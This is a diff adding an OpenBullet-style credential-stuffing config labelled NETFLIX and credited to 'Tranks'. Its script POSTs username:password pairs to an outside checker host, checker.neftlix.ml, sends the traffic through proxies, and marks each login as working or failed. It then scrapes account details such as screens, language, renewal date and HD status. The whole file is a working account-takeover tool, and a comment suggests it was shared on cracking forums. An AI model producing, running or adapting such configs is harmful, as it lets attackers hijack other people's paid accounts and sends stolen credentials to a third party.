@@ -1,0 +1,48 @@
+[SETTINGS]
+{
+  "Name": "NETFLIX",
+  "SuggestedBots": 30,
+  "LastModified": "2019-04-02T08:42:50.8188511+02:00",
+  "AdditionalInfo": "",
+  "Author": "Tranks",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Try BYPASSCF "https://checker.neftlix.ml/check-account" 
+#check REQUEST POST "https://checker.neftlix.ml/check-account" 
+  CONTENT "account=<USER>:<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "working\":true" 
+  KEYCHAIN Failure OR 
+    KEY "working\":false" 
+#TR PARSE "<SOURCE>" LR "screens\":" "," -> CAP "Telas" 
+#AN PARSE "<SOURCE>" LR "language\":\"" "\"," -> CAP "Linguagem" 
+#KS PARSE "<SOURCE>" LR "until\":\"" "\"," -> CAP "Renew" 
+#for_NULLED PARSE "<SOURCE>" LR "\"hasHD\":" "," -> CAP "HD" "" "By Tranks" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"success\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "working\":false" 
